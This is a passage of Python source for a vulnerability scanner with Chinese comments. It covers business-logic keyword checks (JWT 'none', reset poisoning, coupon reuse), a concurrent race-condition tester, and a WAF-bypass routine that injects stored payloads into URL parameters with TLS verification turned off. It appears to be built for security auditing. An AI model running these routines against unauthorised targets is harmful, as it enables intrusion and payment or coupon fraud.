            "reuse_coupon": any(k in url_lower or k in context_str for k in ["coupon", "discount", "promo", "voucher", "code"]),
            "race_payment": any(k in url_lower or k in context_str for k in ["pay", "payment", "order", "checkout", "purchase", "buy"]),
            "bypass_approval": any(k in url_lower or k in context_str for k in ["approve", "approval", "audit", "review", "submit"]),
            "stack_discount": any(k in url_lower or k in context_str for k in ["discount", "coupon", "promo", "sale", "offer"]),
            "bypass_email_verify": any(k in url_lower or k in context_str for k in ["email", "verify", "verification", "register", "signup"]),
            "reset_poisoning": any(k in url_lower or k in context_str for k in ["password", "reset", "forgot", "recovery", "change"]),
            "oauth_misconfig": any(k in url_lower or k in context_str for k in ["oauth", "token", "auth", "login", "callback", "redirect"]),
            "jwt_none": any(k in url_lower or k in context_str for k in ["jwt", "token", "auth", "bearer"]),
        }

        return applicability.get(check_type, False)

    def _execute_logic_check(self, check_type: str, url: str, context: Dict[str, Any]) -> Tuple[bool, str]:
        """执行逻辑漏洞检测（简化实现，返回检测结果和证据）"""
        # 简化实现：只做基础的模式匹配，实际需要复杂的业务逻辑分析
        # 这里返回low confidence的检测结果，需要人工验证

        # 检查URL和上下文中的危险模式
        url_lower = url.lower()
        context_str = json.dumps(context).lower()

        patterns = {
            "modify_price": ["price=", "amount=", "cost=", "total="],
            "modify_quantity": ["quantity=", "qty=", "count="],
            "reuse_coupon": ["coupon=", "discount=", "promo="],
            "race_payment": ["pay", "payment", "checkout"],
            "bypass_approval": ["approve", "status=", "state="],
            "stack_discount": ["discount", "coupon", "promo"],
            "bypass_email_verify": ["email", "verify", "token="],
            "reset_poisoning": ["password", "reset", "token="],
            "oauth_misconfig": ["oauth", "redirect_uri=", "callback="],
            "jwt_none": ["authorization", "bearer", "token"],
        }

        check_patterns = patterns.get(check_type, [])
        for pattern in check_patterns:
            if pattern in url_lower or pattern in context_str:
                return True, f"检测到可能的{check_type}入口: {pattern}"

        return False, ""

    # ===== 5. 竞态条件检测 =====
    def scan_race_condition(self, url: str, method: str = "POST",
                             data: Dict[str, Any] = None, concurrency: int = 10) -> Dict[str, Any]:
        """检测竞态条件漏洞"""
        log.info(f"检测竞态条件: {url} 并发数: {concurrency}")
        results = []
        detected = False

        if not data:
            return {"url": url, "detected": False, "reason": "需要提供请求数据", "results": []}

        async def send_request(session, index):
            try:
                timeout = aiohttp.ClientTimeout(total=30)
                async with session.post(url, json=data, timeout=timeout, ssl=False) as resp:
                    text = await resp.text()
                    return {
                        "index": index,
                        "status_code": resp.status,
                        "response_length": len(text),
                        "response_snippet": text[:200]
                    }
            except Exception as e:
                return {"index": index, "error": str(e)}

        async def race_test():
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                tasks = [send_request(session, i) for i in range(concurrency)]
                return await asyncio.gather(*tasks)

        try:
            responses = asyncio.run(race_test())
        except:
            import requests
            from concurrent.futures import ThreadPoolExecutor
            responses = []
            def send_req(index):
                """发送相关数据。

                    Args:
                    index: 相关参数。

                    Returns:
                    操作结果。
                """
                try:
                    resp = requests.post(url, json=data, timeout=30, verify=False)
                    return {"index": index, "status_code": resp.status_code, "response_length": len(resp.text)}
                except Exception as e:
                    return {"index": index, "error": str(e)}
            with ThreadPoolExecutor(max_workers=concurrency) as executor:
                responses = list(executor.map(send_req, range(concurrency)))

        # 分析竞态条件
        success_count = sum(1 for r in responses if r.get("status_code") == 200)
        status_codes = set(r.get("status_code") for r in responses if "status_code" in r)
        response_lengths = [r.get("response_length", 0) for r in responses if "response_length" in r]

        # 竞态条件特征：多个请求都成功，但应该只有一个成功
        if success_count > 1 and len(status_codes) == 1:
            # 检查响应长度是否一致（一致可能是正常，不一致可能是竞态）
            if len(set(response_lengths)) > 1:
                detected = True
                evidence = f"{success_count}/{concurrency}个请求成功，响应长度不一致，可能存在竞态条件"
            else:
                evidence = f"{success_count}/{concurrency}个请求成功，需要人工验证是否为预期行为"

        if detected:
            vid = self._add_vuln(
                url=url,
                vuln_type="race_condition",
                title="竞态条件漏洞（Race Condition）",
                severity="high",
                method=method,
                evidence=evidence,
                confidence="low",
                cwe_id="CWE-362",
                description="目标可能存在竞态条件漏洞，在高并发情况下多个请求可能同时通过验证，导致业务逻辑被绕过。",
                impact="重复支付、优惠券重复使用、积分重复获取、库存超卖、账户余额异常",
                remediation="1. 使用数据库事务和锁机制；2. 实施乐观锁或悲观锁；3. 使用分布式锁；4. 添加唯一约束；5. 对关键操作进行幂等性设计",
                reproduction_steps=[
                    f"1. 向 {url} 发送{concurrency}个并发请求",
                    "2. 使用相同的请求数据（如相同的优惠券/订单）",
                    "3. 观察所有请求的响应",
                    "4. 如果多个请求都成功执行了应该只执行一次的操作，说明存在竞态条件",
                    "5. 验证实际的业务影响（如重复支付、优惠券重复使用）"
                ],
                tags=["race_condition", "concurrency", "business_logic", "high"]
            )
            results.append(vid)

        return {
            "url": url,
            "concurrency": concurrency,
            "detected": detected,
            "success_count": success_count,
            "total_requests": concurrency,
            "status_codes": list(status_codes),
            "vuln_ids": results,
            "responses": responses[:5],  # 只返回前5个响应
            "note": "竞态条件检测需要人工验证，确认业务影响"
        }

    # ===== 6. WAF绕过测试 =====
    def test_waf_bypass(self, url: str, parameter: str, vuln_type: str = "sql_injection") -> Dict[str, Any]:
        """测试WAF绕过能力"""
        log.info(f"测试WAF绕过: {url} 参数: {parameter} 类型: {vuln_type}")
        results = []
        bypassed = []

        payloads = self.waf_bypass_payloads.get(vuln_type, []) + self.waf_bypass_payloads.get("encoding_bypass", [])

        async def test_payload(payload):
            try:
                timeout = aiohttp.ClientTimeout(total=10)
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[parameter] = [payload]
                modified_query = urlencode(params, doseq=True)
                test_url = urlunparse(parsed._replace(query=modified_query))

                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(test_url, ssl=False) as resp:
                        status = resp.status
                        # WAF拦截特征
                        waf_blocked = status in [403, 406, 429] or "blocked" in (await resp.text()).lower()
                        return {
                            "payload": payload[:50],
                            "status_code": status,
                            "waf_blocked": waf_blocked,
                            "bypassed": not waf_blocked and status == 200
                        }
            except Exception as e:
                return {"payload": payload[:50], "error": str(e)}

        async def test_all():
            tasks = [test_payload(p) for p in payloads[:10]]
            return await asyncio.gather(*tasks)

        try:
            test_results = asyncio.run(test_all())
        except:
            import requests
            test_results = []
            for payload in payloads[:10]:
                try:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[parameter] = [payload]
                    modified_query = urlencode(params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=modified_query))
                    resp = requests.get(test_url, timeout=10, verify=False)
                    waf_blocked = resp.status_code in [403, 406, 429]
                    test_results.append({
                        "payload": payload[:50], "status_code": resp.status_code,
                        "waf_blocked": waf_blocked,
                        "bypassed": not waf_blocked and resp.status_code == 200
                    })
                except Exception as e:
                    test_results.append({"payload": payload[:50], "error": str(e)})

        for result in test_results:
            if result.get("bypassed"):
                bypassed.append(result)

        return {
            "url": url,
            "parameter": parameter,
            "vuln_type": vuln_type,
            "tested_count": min(len(payloads), 10),
            "bypassed_count": len(bypassed),
            "bypassed_payloads": bypassed,
            "waf_present": any(r.get("waf_blocked") for r in test_results),
            "results": test_results
        }

    # ===== 综合扫描 =====
    def full_advanced_scan(self, url: str, parameters: List[str] = None,
                            context: Dict[str, Any] = None,
                            user1_cookie: str = "", user2_cookie: str = "") -> Dict[str, Any]:
        """执行完整的高阶漏洞扫描"""
        log.info(f"开始高阶漏洞扫描: {url}")
        all_results = {}

        # 1. 反序列化漏洞
        all_results["deserialization"] = self.scan_deserialization(url)

        # 2. XXE漏洞
        all_results["xxe"] = self.scan_xxe(url)

        # 3. IDOR漏洞（如果有两个用户凭证）
        if user1_cookie and user2_cookie and parameters:
            all_results["idor"] = self.scan_idor(url, parameters[0], user1_cookie, user2_cookie)

        # 4. 逻辑漏洞
        all_results["logic"] = self.scan_logic_vulnerabilities(url, context)

        # 5. 竞态条件（如果是POST请求且有数据）
        if context and context.get("method") == "POST" and context.get("data"):
            all_results["race_condition"] = self.scan_race_condition(url, "POST", context["data"])

        total_vulns = sum(r.get("vuln_count", 0) for r in all_results.values() if isinstance(r, dict))

        return {
            "url": url,
            "total_vulnerabilities": total_vulns,
            "scan_results": all_results,
            "completed_at": time.time()
        }

    # ===== 查询漏洞 =====
    def get_vulns(self, vuln_type: str = None, severity: str = None,
                   confidence: str = None) -> List[Dict[str, Any]]:
        """获取漏洞列表"""
        results = []
        for vuln in self.vulns.values():
            if vuln_type and vuln.vuln_type != vuln_type:
                continue
            if severity and vuln.severity != severity:
                continue
            if confidence and vuln.confidence != confidence:
                continue
            results.append(vuln.to_dict())
        results.sort(key=lambda x: x["discovered_at"], reverse=True)
        return results

    def get_statistics(self) -> Dict[str, Any]:
        """获取统计信息"""
        by_type = {}
        by_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        by_confidence = {"high": 0, "medium": 0, "low": 0}
        for vuln in self.vulns.values():
            vtype = vuln.vuln_type
            by_type[vtype] = by_type.get(vtype, 0) + 1
            by_severity[vuln.severity] = by_severity.get(vuln.severity, 0) + 1
            by_confidence[vuln.confidence] = by_confidence.get(vuln.confidence, 0) + 1

        return {
            "total_vulns": len(self.vulns),
            "by_type": by_type,
            "by_severity": by_severity,
            "by_confidence": by_confidence,
            "unique_urls": len(set(v.url for v in self.vulns.values()))
        }


# 全局实例
advanced_vuln_scanner = AdvancedVulnScanner()
